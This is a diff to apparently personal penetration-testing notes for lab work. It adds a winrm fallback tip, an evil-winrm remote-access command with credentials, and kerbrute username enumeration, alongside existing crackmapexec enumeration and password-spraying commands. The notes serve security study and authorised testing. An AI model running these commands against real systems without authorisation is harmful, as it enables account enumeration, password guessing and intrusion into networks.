@@ -2,6 +2,7 @@
 
 ## Tool 1: crackmapexec
 - Built-in in kali linux
+- **IF smb protocol fails, try winrm protocol**
 - enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
 - enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
 - RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
@@ -26,6 +27,9 @@
 - Built-in in kali linux
 - Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
 - Provides Domain SID, passwords of some users, share enumerations
+
+## Tool 4: evil-winrm
+- remote access tool: `evil-winrm -i 192.168.194.165 -u enox -p california`         
 
 # Persistence
 ## Using crackmapexec
@@ -91,9 +95,10 @@ crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_con
 ```
 
 - Spray with Kerbrute
-- Principle is if username and password is correct, we will obtain a TGT. Kerbrute will test all username and password and return us with success if TGT is obtained with a valid username and password
+- Principle: if username and password is correct, we will obtain a TGT. Kerbrute will test all username and password and return us with success if TGT is obtained with a valid username and password. **Can also just test with username to see if the user is a valid user in the domain.**
 ```bash
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
+kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip 192.168.194.165
 ```
 
 - Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1) (For LDAP protocol)
